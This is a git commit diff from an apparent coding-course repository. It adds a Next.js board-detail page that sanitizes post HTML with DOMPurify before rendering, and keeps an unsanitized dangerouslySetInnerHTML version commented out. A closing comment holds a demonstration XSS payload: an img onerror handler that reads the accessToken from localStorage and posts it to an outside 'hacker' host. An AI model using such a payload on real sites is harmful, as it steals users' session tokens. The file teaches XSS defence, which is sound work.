8199965dc1972f2f119f5a0ab13b164de379f4d9
pepper-sister <yuyu7123@naver.com>
2026-03-20 16:37:46 +0900

    section30

---
+++ class-practice/my-app/src/app/section30/30-04-web-editor-hook-form-xss-hydration/[boardId]/page.tsx
@@ -0,0 +1,69 @@
+"use client";
+
+import { gql } from "@apollo/client";
+import { useQuery } from "@apollo/client/react";
+import { useParams } from "next/navigation";
+import Dompurify from "dompurify";
+
+const FETCH_BOARD = gql`
+  query fetchBoard($boardId: ID!) {
+    fetchBoard(boardId: $boardId) {
+      _id
+      writer
+      title
+      contents
+    }
+  }
+`;
+
+export default function StaticRoutingMovedPage() {
+  const params = useParams();
+
+  const { data } = useQuery(FETCH_BOARD, {
+    variables: { boardId: params.boardId },
+  });
+
+  console.log(data);
+
+  return (
+    <>
+      {/* <div>{params.qqq}번 게시글 상세페이지 이동이 완료되었습니다.</div> */}
+      <div>작성자: {data && data.fetchBoard.writer}</div>
+      <div>제목: {data?.fetchBoard.title}</div>
+      {/* <div>내용: {data ? data.fetchBoard.contents : ""}</div> */}
+
+      {/* 내용에 들어있는 태그를 문자열이 아닌 진짜 태그로 인식하기 */}
+      {/* <div
+        dangerouslySetInnerHTML={{
+          __html: data?.fetchBoard.contents,
+        }}
+      /> */}
+
+      {/* 내용에 들어있는 태그가 <script />태그처럼 공격 태그가 있을 수 있으니 막아줘! */}
+      {typeof window !== "undefined" ? (
+        <div
+          dangerouslySetInnerHTML={{
+            __html: Dompurify.sanitize(data?.fetchBoard.contents),
+          }}
+        />
+      ) : (
+        <div></div>
+      )}
+    </>
+  );
+}
+
+/* playground XSS 공격
+==================================================================
+contents: """
+          <img src='#' onerror='
+            const 훔친토큰 = localStorage.getItem("accessToken");
+            fetch("http://main-hacker.codebootcamp.co.kr/token", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ token: 훔친토큰 })
+            })'
+          />
+"""
+==================================================================
+*/
